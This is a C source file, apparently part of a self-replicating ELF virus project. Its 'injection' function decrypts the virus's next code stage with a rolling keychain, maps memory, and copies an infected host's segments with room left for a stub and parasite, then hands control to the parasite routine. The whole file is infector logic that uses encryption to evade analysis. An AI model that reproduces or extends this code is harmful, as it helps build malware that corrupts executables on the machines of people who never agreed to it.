#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
{
	const size_t stub_size = (void *)__exit - (void *)L1;

	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - stub_size;
	const size_t end_stub = PAGE_SIZE + stub_size;
	const size_t beg_parasite = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
	const size_t end_parasite = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));

	for (register size_t index = 0; index < beg_stub; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_stub; index++)
		*dst++ = 0;

	src += stub_size;

	for (register size_t index = 0; index < beg_parasite; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_parasite; index++)
		*dst++ = 0;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
#if LOGGER
	MID_LOGGER("injection:\t\t");
#endif

	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	if (context == FAILURE)
		goto label;

	struct s_infect infect;

	infect.filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;

	if ((infect.ptr = _mmap(NULL, infect.filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	write_on_memory(infect.ptr, (char *)host->header, host->segment);

label:
	update_keychain_left(keychain, (char *)injection, (void *)parasite - (void *)injection);
	decrypt_left(keychain, (char *)parasite, (void *)stub - (void *)parasite);

	parasite(host, keychain, context, &infect);
}
